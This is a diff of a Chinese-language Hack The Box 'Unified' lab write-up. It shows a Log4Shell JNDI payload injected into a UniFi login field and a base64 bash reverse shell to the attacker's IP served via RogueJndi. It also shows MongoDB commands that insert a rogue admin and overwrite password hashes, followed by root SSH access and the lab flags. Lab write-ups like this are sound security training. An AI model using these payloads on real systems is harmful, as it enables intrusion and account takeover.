@@ -29,7 +29,9 @@ tags:
 
 ![](/image/hackthebox/Unified-4.png)
 
-![](/image/hackthebox/Unified-5.png)仔细观察登录窗口即可
+![](/image/hackthebox/Unified-5.png)
+
+仔细观察登录窗口即可
 
 ## TASK 4
 ![](/image/hackthebox/Unified-6.png)
@@ -50,9 +52,11 @@ tags:
 
 使用burp或者开发者工具抓取登录时的数据包，同时使用tcpdump抓取攻击机tun0的389端口
 
+```bash
 sudo tcpdump -i tun0 port 389
+```
 
-编辑登录数据包，在data的remember字段中把flase改成"${jndi:ldap://10.10.16.20/whatever}"，重新发送数据包
+编辑登录数据包，在data的remember字段中把flase改成`"${jndi:ldap://10.10.16.20/whatever}"`，重新发送数据包
 
 ![](/image/hackthebox/Unified-9.png)
 
@@ -108,9 +112,10 @@ JNDI注入：
 
 
 
+```java
 ctx.lookup("rmi://your-server/refObj");// 初始化的
-
 ctx.lookup("ldap://your-server/cn=bar,dc=test,dc=org");//实际上传进来的
+```
 
 **命名引用**：Java为了将Object对象存储在Naming（命名）或Directory（目录）服务下，提供了Naming Reference（命名引用）功能，对象可以通过绑定Reference类存储在Naming或Directory服务下，比如RMI、LDAP等。
 
@@ -167,9 +172,11 @@ Tcpdump
 
 刚刚示范的那样tcpdump抓取攻击机tun0的389端口
 
+```bash
 sudo tcpdump -i tun0 port 389
+```
 
-编辑登录数据包，在data的remember字段中把flase改成"${jndi:ldap://10.10.16.20/whatever}"
+编辑登录数据包，在data的remember字段中把flase改成`"${jndi:ldap://10.10.16.20/whatever}"`
 
 接收到数据
 
@@ -191,56 +198,83 @@ sudo tcpdump -i tun0 port 389
 
 要使用 Rogue-JNDI 服务器，我们必须构造并传递一个payload，该payload将负责在目标系统上为我们提供一个 shell。对payload进行 Base64 编码，以防止出现任何编码问题。
 
+```bash
 echo 'bash -c bash -i >&/dev/tcp/your_tun0_ip/port 0>&1' | base64
+```
 
 打印出一串base64编码的字符
 
+```plain
 YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzIDA+JjEK
+```
 
 接下来使用RogueJndi-1.1.jar并监听4444端口
 
-> java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzIDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"![](/image/hackthebox/Unified-17.png)
->
+```bash
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzIDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"
+```
+
+![](/image/hackthebox/Unified-17.png)
 
 利用tomcat传参
 
+```plain
 ldap://10.10.16.20:1389/o=tomcat
 
 "${jndi:ldap://10.10.16.20:1389/o=tomcat/whatever}"
+```
 
 按理来讲应该getshell了呀，为什么不弹呢，重新来一次吧
 
+```bash
 echo 'bash -c bash -i >&/dev/tcp/10.10.16.20/4433 0>&1' | base64
+```
 
+```plain
 YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzMyAwPiYxCg==
+```
 
+```bash
 java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzMyAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"
+```
 
+```plain
 ldap://10.10.16.20:1389/o=tomcat
 
 "${jndi:ldap://10.10.16.20:1389/o=tomcat/whatever}"
+```
 
 还是不弹，见鬼了
 
 再来！！
 
+```bash
 echo 'bash -c bash -i >&/dev/tcp/10.10.16.20/4444 0>&1' | base64
+```
 
+```plain
 YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQ0NCAwPiYxCg==
+```
 
+```bash
 java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"
+```
 
 呜呜终于弹了
 
 原来是多打了个whatever导致的
 
+```plain
 "${jndi:ldap://10.10.16.20:1389/o=tomcat}"
+```
 
 ![](/image/hackthebox/Unified-18.png)
 
 由于不是交互式shell看着难受咱们可以改一下
 
+```bash
 SHELL=/bin/bash script -q /dev/null : 
+```
 
 使用**ps aux**查看系统有哪些进程，发现27117端口存在mongodb数据库
 
@@ -255,9 +289,10 @@ SHELL=/bin/bash script -q /dev/null :
 
 由于看的界面非常小，所以我们将这个输出到文档里，之后cat进行查看
 
+```bash
 ps aux > process_list.txt
-
 cat process_list.txt
+```
 
 ![](/image/hackthebox/Unified-20.png)
 
@@ -266,23 +301,31 @@ cat process_list.txt
 ## TASK 9
 ![](/image/hackthebox/Unified-21.png)
 
+```bash
 mongodb --port 2717
+```
 
 直接本地进行连接数据库
 
-![](/image/hackthebox/Unified-22.png)show dbs一下
+![](/image/hackthebox/Unified-22.png)
+
+show dbs一下
 
 发现默认数据库名字为ace
 
 ## TASK 10
 ![](/image/hackthebox/Unified-23.png)
 
+```javascript
 db.admin.find()
+```
 
 ## TASK 11
 ![](/image/hackthebox/Unified-24.png)
 
+```javascript
 db.admin.update()
+```
 
 ## TASK 12
 ![](/image/hackthebox/Unified-25.png)
@@ -296,8 +339,11 @@ db.admin.update()
 这时想到可以把administrator的密码修改成弱密码如password  
 先使用**mkpasswd -m sha-512 password**命令，得到password的sha512加密后的值
 
+```plain
 $6$H/9uby/SS.lqTZt1$AxcFwPi8z5MpDd1D7Efv/xrEiPE2TZxKHKqOVk//b/salsNhZfwY2jtKfUQPdsJU8RXCl7iP9NzPD6YDnGeae0
+```
 
+```javascript
 db.admin.insert({
 
   "email": "pilgrim@localhost.local",
@@ -311,6 +357,7 @@ db.admin.insert({
   "x_shadow": "$6$H/9uby/SS.lqTZt1$AxcFwPi8z5MpDd1D7Efv/xrEiPE2TZxKHKqOVk//b/salsNhZfwY2jtKfUQPdsJU8RXCl7iP9NzPD6YDnGeae0"
 
 })
+```
 
 
 
@@ -320,20 +367,27 @@ db.admin.insert({
 
 执行成功后寻找刚刚添加的用户
 
+```javascript
 db.admin.find().forEach(printjson);
+```
 
 ![](/image/hackthebox/Unified-28.png)
 
 id 65e48cdb4a29d756feab4d2a
 
 **查看一下网站的用户的详细信息**  
+
+```javascript
 db.site.find().forEach(printjson);
+```
 
 这里由于不回显导致无法进行下一步（按理来说应该回显的）
 
 **将我们插入的用户绑定到这个网站上去，其中的admin_id就是自己添加的用户的id，site_id就是上面获取的id**
 
-**db.privilege.insert({"admin_id":"xxxx","permisions":[],"role":"admin","site_id":"xxxx"});**
+```javascript
+db.privilege.insert({"admin_id":"xxxx","permisions":[],"role":"admin","site_id":"xxxx"});
+```
 
 接着去后台登录的页面登录刚才的账号，密码是自己设置的密码。
 
@@ -346,11 +400,15 @@ NotACrackablePassword4U2022然后ssh登录就行了
 
 先使用**mkpasswd -m sha-512 password**命令，得到password的sha512加密后的值
 
+```plain
 $6$6LGfhVdE.SrlGbsq$j///PNBrdvqlNnL35Lqoowj51HgTmEiw1vKfCZDUq9BoGq9Dk3E4pIXufMWz6cmRQV6lYctTpYQwAe15PWYN3/
+```
 
 将administrator的密码修改为password
 
+```bash
 mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set：{"x_shadow":"$$6$6LGfhVdE.SrlGbsq$j///PNBrdvqlNnL35Lqoowj51HgTmEiw1vKfCZDUq9BoGq9Dk3E4pIXufMWz6cmRQV6lYctTpYQwAe15PWYN3/"}})'
+```
 
 再使用修改后的密码登录网站，登录成功
 
@@ -364,8 +422,11 @@ NotACrackablePassword4U2022
 
 ssh远程连接后以为root用户，提权成功
 
+```bash
 ssh root@10.129.45.240
+```
 
+```plain
 user.txt
 
 6ced1a6a89e666c0620cdb10262ba127
@@ -373,4 +434,4 @@ user.txt
 root.txt
 
 e50bc93c75b634e4b272d2f771c33681
-
+```
